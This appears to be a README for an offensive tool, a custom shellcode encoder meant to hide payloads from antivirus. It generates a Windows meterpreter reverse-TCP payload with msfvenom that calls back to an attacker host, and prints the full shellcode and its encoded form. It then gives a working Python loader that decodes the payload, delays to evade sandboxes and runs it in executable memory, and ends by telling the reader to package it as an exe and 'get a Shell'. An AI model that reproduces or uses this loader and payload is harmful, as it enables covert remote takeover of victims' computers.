Shell Encoder
============

A minimalist Custom Shellencoder in C++. All Hex Chars (0-F) in Shellcode are mapped to ASCII (g-v).
You can change the key-map in `Source/enc.cpp` and `Source/dec.cpp`. Make sure the key-map match,
a single mismatch screws up everything.

Tested on my ArchLinux instance (x64).


The POC is far from perfect (even though it works), roll with the idea and write a better code :)

### Let's Play "Game of Exec"

Write a Shellexec with an encoded Shellcode, use the `Source/dec.cpp` as the decoder stab. You can compile for Windows 
in Linux using MinGW as well. 

### Use Case.

####Generate Shellcode

```bash
root@hell # msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.55.28.7 LPORT=443 -f c 

unsigned char buf[] = 
"\xb8\x45\x4a\xa0\x3b\xdd\xc6\xd9\x74\x24\xf4\x5b\x29\xc9\xb1\x54\x83\xeb\xfc\x31\x43\x0f"
"\x03\x43\x4a\xa8\x55\xc7\xbc\xae\x96\x38\x3c\xcf\x1f\xdd\x0d\xcf\x44\x95\x3d\xff\x0f\xfb\xb1\x74\x5d\xe8"
"\x42\xf8\x4a\x1f\xe3\xb7\xac\x2e\xf4\xe4\x8d\x31\x76\xf7\xc1\x91\x47\x38\x14\xd3\x80\x25\xd5\x81\x59\x21"
"\x48\x36\xee\x7f\x51\xbd\xbc\x6e\xd1\x22\x74\x90\xf0\xf4\x0f\xcb\xd2\xf7\xdc\x67\x5b\xe0\x01\x4d\x15\x9b"
"\xf1\x39\xa4\x4d\xc8\xc2\x0b\xb0\xe5\x30\x55\xf4\xc1\xaa\x20\x0c\x32\x56\x33\xcb\x49\x8c\xb6\xc8\xe9\x47"
"\x60\x35\x08\x8b\xf7\xbe\x06\x60\x73\x98\x0a\x77\x50\x92\x36\xfc\x57\x75\xbf\x46\x7c\x51\xe4\x1d\x1d\xc0"
"\x40\xf3\x22\x12\x2b\xac\x86\x58\xc1\xb9\xba\x02\x8d\x0e\xf7\xbc\x4d\x19\x80\xcf\x7f\x86\x3a\x58\x33\x4f"
"\xe5\x9f\x34\x7a\x51\x0f\xcb\x85\xa2\x19\x0f\xd1\xf2\x31\xa6\x5a\x99\xc1\x47\x8f\x34\xc7\xdf\x3a\xfe\xdb"
"\x18\x53\x02\xe4\x27\x18\x8b\x02\x77\x0e\xdc\x9a\x37\xfe\x9c\x4a\xdf\x14\x13\xb4\xff\x16\xf9\xdd\x95\xf8"
"\x54\xb5\x01\x60\xfd\x4d\xb0\x6d\x2b\x28\xf2\xe6\xde\xcc\xbc\x0e\xaa\xde\xa8\x6e\x54\x1f\x28\x1b\x54\x75"
"\x2c\x8d\x03\xe1\x2e\xe8\x64\xae\xd1\xdf\xf6\xa9\x2d\x9e\xce\xc2\x1b\x34\x6f\xbd\x63\xd8\x6f\x3d\x35\xb2"
"\x6f\x55\xe1\xe6\x23\x40\xee\x32\x50\xd9\x7a\xbd\x01\x8d\x2d\xd5\xaf\xe8\x19\x7a\x4f\xdf\x1a\x7d\xaf\x9d"
"\x3e\x26\xd8\x5d\x7e\xd6\x18\x34\x7e\x86\x70\xc3\x51\x29\xb1\x2c\x78\x62\xd9\xa7\xec\xc0\x78\xb7\x25\x84"
"\x24\xb8\xc9\x1d\x30\x37\x2e\xa2\x3d\xb9\x13\x74\x04\xcf\x54\x44\x33\xc0\xef\xe9\x12\x4b\x0f\xbd\x65\x5e";
```

####Encoded
```bash
root@hell #./encoder 

Enter Shellcode: \xb8\x45\x4a\xa0\x3b\xdd\xc6\xd9\x74\x24\xf4\x5b\x29\xc9\xb1\x54\x83\xeb\xfc\x31\x43\x0f
\x03\x43\x4a\xa8\x55\xc7\xbc\xae\x96\x38\x3c\xcf\x1f\xdd\x0d\xcf\x44\x95\x3d\xff\x0f\xfb\xb1\x74\x5d\xe8
\x42\xf8\x4a\x1f\xe3\xb7\xac\x2e\xf4\xe4\x8d\x31\x76\xf7\xc1\x91\x47\x38\x14\xd3\x80\x25\xd5\x81\x59\x21
\x48\x36\xee\x7f\x51\xbd\xbc\x6e\xd1\x22\x74\x90\xf0\xf4\x0f\xcb\xd2\xf7\xdc\x67\x5b\xe0\x01\x4d\x15\x9b
\xf1\x39\xa4\x4d\xc8\xc2\x0b\xb0\xe5\x30\x55\xf4\xc1\xaa\x20\x0c\x32\x56\x33\xcb\x49\x8c\xb6\xc8\xe9\x47
\x60\x35\x08\x8b\xf7\xbe\x06\x60\x73\x98\x0a\x77\x50\x92\x36\xfc\x57\x75\xbf\x46\x7c\x51\xe4\x1d\x1d\xc0
\x40\xf3\x22\x12\x2b\xac\x86\x58\xc1\xb9\xba\x02\x8d\x0e\xf7\xbc\x4d\x19\x80\xcf\x7f\x86\x3a\x58\x33\x4f
\xe5\x9f\x34\x7a\x51\x0f\xcb\x85\xa2\x19\x0f\xd1\xf2\x31\xa6\x5a\x99\xc1\x47\x8f\x34\xc7\xdf\x3a\xfe\xdb
\x18\x53\x02\xe4\x27\x18\x8b\x02\x77\x0e\xdc\x9a\x37\xfe\x9c\x4a\xdf\x14\x13\xb4\xff\x16\xf9\xdd\x95\xf8
\x54\xb5\x01\x60\xfd\x4d\xb0\x6d\x2b\x28\xf2\xe6\xde\xcc\xbc\x0e\xaa\xde\xa8\x6e\x54\x1f\x28\x1b\x54\x75
\x2c\x8d\x03\xe1\x2e\xe8\x64\xae\xd1\xdf\xf6\xa9\x2d\x9e\xce\xc2\x1b\x34\x6f\xbd\x63\xd8\x6f\x3d\x35\xb2
\x6f\x55\xe1\xe6\x23\x40\xee\x32\x50\xd9\x7a\xbd\x01\x8d\x2d\xd5\xaf\xe8\x19\x7a\x4f\xdf\x1a\x7d\xaf\x9d
\x3e\x26\xd8\x5d\x7e\xd6\x18\x34\x7e\x86\x70\xc3\x51\x29\xb1\x2c\x78\x62\xd9\xa7\xec\xc0\x78\xb7\x25\x84
\x24\xb8\xc9\x1d\x30\x37\x2e\xa2\x3d\xb9\x13\x74\x04\xcf\x54\x44\x33\xc0\xef\xe9\x12\x4b\x0f\xbd\x65\x5e


New Encoded Shellcode :

ghysghmoghmwghwighlygh__ghzpgh_ughqmghkmgh=mghoyghkughzughyjghomghslgh+ygh=zghljghmlghi=ghilghmlghmwghws
ghooghzqghyzghw+ghupghlsghlzghz=ghj=gh__ghi_ghz=ghmmghuoghl_gh==ghi=gh=yghyjghqmgho_gh+sghmkgh=sghmwghj
=gh+lghyqghwzghk+gh=mgh+mghs_ghljghqpgh=qghzjghujghmqghlsghjmgh_lghsighkogh_oghsjghoughkjghmsghlpgh++gh
q=ghojghy_ghyzghp+gh_jghkkghqmghuigh=igh=mghi=ghzygh_kgh=qgh_zghpqghoygh+ighijghm_ghjoghuygh=jghlughwmg
hm_ghzsghzkghiyghyigh+oghlighoogh=mghzjghwwghkighizghlkghopghllghzyghmughszghypghzsgh+ughmqghpighloghis
ghsygh=qghy+ghipghpighqlghusghiwghqqghoighukghlpgh=zghoqghqoghy=ghmpghqzghojgh+mghj_ghj_ghzighmigh=lghk
kghjkghkyghwzghspghosghzjghyughywghikghs_ghi+gh=qghyzghm_ghjughsighz=ghq=ghspghlwghosghllghm=gh+oghu=gh
lmghqwghojghi=ghzyghsoghwkghjughi=gh_jgh=kghljghwpghowghuughzjghmqghs=ghlmghzqgh_=ghlwgh=+gh_yghjsgholg
hikgh+mghkqghjsghsyghikghqqghi+gh_zghuwghlqgh=+ghuzghmwgh_=ghjmghjlghymgh==ghjpgh=ugh__ghuogh=sghomghyo
ghijghpigh=_ghm_ghyighp_ghkyghksgh=kgh+pgh_+ghzzghyzghi+ghwwgh_+ghwsghp+ghomghj=ghksghjyghomghqoghkzghs
_ghilgh+jghk+gh+sghpmghw+gh_jgh_=gh=pghwughk_ghu+ghz+ghzkghjyghlmghp=ghy_ghplgh_sghp=ghl_ghloghykghp=gh
oogh+jgh+pghklghmigh++ghlkghoigh_ughqwghy_ghijghs_ghk_gh_oghw=gh+sghjughqwghm=gh_=ghjwghq_ghw=ghu_ghl+g
hkpgh_sgho_ghq+gh_pghjsghlmghq+ghspghqighzlghojghkughyjghkzghqsghpkgh_ughwqgh+zghzighqsghyqghkoghsmghkm
ghysghzughj_ghlighlqghk+ghwkghl_ghyughjlghqmghimghz=ghomghmmghllghzigh+=gh+ughjkghmyghi=ghy_ghpogho+

```
####Python ShellExec Using the encoded Shellcode

```python
#!/usr/bin/python

import ctypes
import time

def decoder(data):
	"""A function to decode the passed encoded shellcode."""
	jesus0 = data.replace("h","x")
	jesus1 = jesus0.replace("i","0")
	jesus2 = jesus1.replace("j","1")
	jesus3 = jesus2.replace("k","2")
	jesus4 = jesus3.replace("l","3")
	jesus5 = jesus4.replace("m","4")
	jesus6 = jesus5.replace("o","5")
	jesus7 = jesus6.replace("p","6")
	jesus8 = jesus7.replace("q","7")
	jesus9 = jesus8.replace("s","8")
	jesusa = jesus9.replace("u","9")
	jesusb = jesusa.replace("w","a")
	jesusc = jesusb.replace("y","b")
	jesusd = jesusc.replace("z","c")
	jesuse = jesusd.replace("_","d")
	jesusf = jesuse.replace("+","e")
	jesuse = jesusf.replace("=","f")
	jesus = jesuse.replace("g","\\")
	return jesus

# Take a nap
time.sleep(60)

# Encoded Shellcode
salvation = "ENTER THE ENCODED SHELLCODE HERE"

# Decode the encoded Shellcode
diablo = decoder(salvation)

# Take another nap
time.sleep(60)

# Cast the decoded shellcode to bytearray and 
jesus = bytearray(diablo.replace('\\x', '').decode('hex'))

ptr = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(0),
                                          ctypes.c_int(len(jesus)),
                                          ctypes.c_int(0x3000),
                                          ctypes.c_int(0x40))
 
buf = (ctypes.c_char * len(jesus)).from_buffer(jesus)
 
ctypes.windll.kernel32.RtlMoveMemory(ctypes.c_int(ptr),
                                     buf,
                                     ctypes.c_int(len(jesus)))
 
ht = ctypes.windll.kernel32.CreateThread(ctypes.c_int(0),
                                         ctypes.c_int(0),
                                         ctypes.c_int(ptr),
                                         ctypes.c_int(0),
                                         ctypes.c_int(0),
                                         ctypes.pointer(ctypes.c_int(0)))
 
ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(ht),ctypes.c_int(-1))

```
#### Convert the Python to Exe and get a Shell.

![Py2EXE](https://s29.postimg.org/5em0w2pnr/payslip.png)

![Meterpreter](https://s29.postimg.org/ux1n4qrfb/image.png)



